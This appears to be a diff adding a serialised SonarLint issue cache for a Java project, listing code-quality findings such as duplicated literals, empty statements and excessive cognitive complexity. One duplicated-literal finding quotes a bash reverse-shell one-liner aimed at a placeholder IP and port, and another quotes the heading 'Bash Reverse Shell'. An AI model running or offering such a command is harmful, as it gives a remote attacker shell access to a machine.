@@ -1,0 +1,70 @@
+
+l	java:S117š"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ
+S
+java:S2209Å"5Change this instance-reference to a static reference.(€ïé“8¯ğ«éî.
+t
+java:S1450"^Remove the "generatorInvite" field and declare it as a local variable in the relevant methods.(à­÷ê
+H
+java:S1602¹",Remove useless curly braces around statement(¦´ˆúÿÿÿÿ
+8
+java:S1116"Remove this empty statement.(Åñ­õşÿÿÿÿ
+h
+java:S3776"RRefactor this method to reduce its Cognitive Complexity from 90 to the 15 allowed.(Âú
+7
+java:S1116p"Remove this empty statement.(Åñ­õşÿÿÿÿ
+S
+java:S2209Ï"5Change this instance-reference to a static reference.(€ïé“8¯ğ«éî.
+i
+java:S1192•"RDefine a constant instead of duplicating this literal "Use this code \n" 14 times.(Å”•‡
+j
+java:S1192<"ODefine a constant instead of duplicating this literal "1\uFE0F\u20E3" 12 times.(Å‡Åùÿÿÿÿ
+b
+java:S11923"GDefine a constant instead of duplicating this literal "\u2754" 9 times.(àÏ¥şÿÿÿÿ
+S
+java:S2209†"5Change this instance-reference to a static reference.(€ïé“8¯ğ«éî.
+H
+java:S1602š",Remove useless curly braces around statement(¦´ˆúÿÿÿÿ
+p
+java:S1450"URemove the "config" field and declare it as a local variable in the relevant methods.(şØÆ±øÿÿÿÿ
+8
+java:S1116"Remove this empty statement.(Åñ­õşÿÿÿÿ
+8
+java:S1116×"Remove this empty statement.(Åñ­õşÿÿÿÿ
+8
+java:S1116ú"Remove this empty statement.(Åñ­õşÿÿÿÿ
+8
+java:S1116ñ"Remove this empty statement.(Åñ­õşÿÿÿÿ
+Œ
+java:S1192("qDefine a constant instead of duplicating this literal "```bash -i >& /dev/tcp/YOURIP/YOURPORT 0>&1```\n" 3 times.(²Õæáùÿÿÿÿ
+8
+java:S1116º"Remove this empty statement.(Åñ­õşÿÿÿÿ
+G
+java:S1602}",Remove useless curly braces around statement(¦´ˆúÿÿÿÿ
+S
+java:S2209Š"5Change this instance-reference to a static reference.(€ïé“8¯ğ«éî.
+r
+java:S1192&"WDefine a constant instead of duplicating this literal "**Bash Reverse Shell**" 3 times.(‘³¶‡ÿÿÿÿÿ
+S
+java:S2209ò"5Change this instance-reference to a static reference.(€ïé“8¯ğ«éî.
+i
+java:S1192x"SDefine a constant instead of duplicating this literal "Use this code  \n " 4 times.(Å”•‡
+8
+java:S1116É"Remove this empty statement.(Åñ­õşÿÿÿÿ
+d
+java:S1192E"NDefine a constant instead of duplicating this literal "2\uFE0F\u20E3" 8 times.(¹ò©«
+p
+java:S1192@"UDefine a constant instead of duplicating this literal "**Use this code**\n " 6 times.(È™²¨ıÿÿÿÿ
+R
+java:S2209h"5Change this instance-reference to a static reference.(€ïé“8¯ğ«éî.
+8
+java:S1116«"Remove this empty statement.(Åñ­õşÿÿÿÿ
+S
+java:S2209ë"5Change this instance-reference to a static reference.(€ïé“8¯ğ«éî.
+S
+java:S2209±"5Change this instance-reference to a static reference.(€ïé“8¯ğ«éî.
+i
+java:S1192S"NDefine a constant instead of duplicating this literal "3\uFE0F\u20E3" 4 times.(ßËçÌıÿÿÿÿ
+i
+java:S1192\"NDefine a constant instead of duplicating this literal "\uD83C\uDFE0" 12 times.(ç‰»Òÿÿÿÿÿ
+S
+java:S2209§"5Change this instance-reference to a static reference.(€ïé“8¯ğ«éî.
